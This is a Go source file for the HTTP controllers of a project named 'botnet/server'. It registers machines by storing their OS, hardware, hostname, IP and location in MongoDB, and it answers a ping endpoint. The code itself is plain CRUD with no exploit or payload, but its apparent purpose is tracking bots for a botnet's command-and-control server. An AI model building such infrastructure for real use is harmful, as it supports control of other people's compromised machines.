package controllers

import (
	"botnet/server/configs"
	"botnet/server/models"
	"botnet/server/responses"
	"context"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/go-playground/validator"

	// "go.mongodb.org/mongo-driver/bson/primitive"
	"go.mongodb.org/mongo-driver/mongo"
)

var botCollection *mongo.Collection = configs.GetCollection(configs.DB, "bots")
var validate = validator.New()

func CreateBot() gin.HandlerFunc {
	return func(c *gin.Context) {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		var bot models.Bot
		defer cancel()

		//validate the request body
		if err := c.BindJSON(&bot); err != nil {
			c.JSON(http.StatusBadRequest, responses.BotResponse{Status: http.StatusBadRequest, Message: "error", Data: map[string]interface{}{"data": err.Error()}})
			return
		}

		//use the validator library to validate required fields
		if validationErr := validate.Struct(&bot); validationErr != nil {
			c.JSON(http.StatusBadRequest, responses.BotResponse{Status: http.StatusBadRequest, Message: "error", Data: map[string]interface{}{"data": validationErr.Error()}})
			return
		}

		newBot := models.Bot{
			Os:       bot.Os,
			Ram:      bot.Ram,
			Cpu:      bot.Cpu,
			Disk:     bot.Disk,
			Platform: bot.Platform,
			Hostname: bot.Hostname,
			Ip:       bot.Ip,
			Location: bot.Location,
		}

		result, err := botCollection.InsertOne(ctx, newBot)
		if err != nil {
			c.JSON(http.StatusInternalServerError, responses.BotResponse{Status: http.StatusInternalServerError, Message: "error", Data: map[string]interface{}{"data": err.Error()}})
			return
		}

		c.JSON(http.StatusCreated, responses.BotResponse{Status: http.StatusCreated, Message: "success", Data: map[string]interface{}{"data": result}})
	}
}

func Ping() gin.HandlerFunc {
	return func(c *gin.Context) {
		c.JSON(http.StatusOK, responses.BotResponse{Status: http.StatusOK, Message: "success", Data: map[string]interface{}{"message": "pong"}})
	}
}
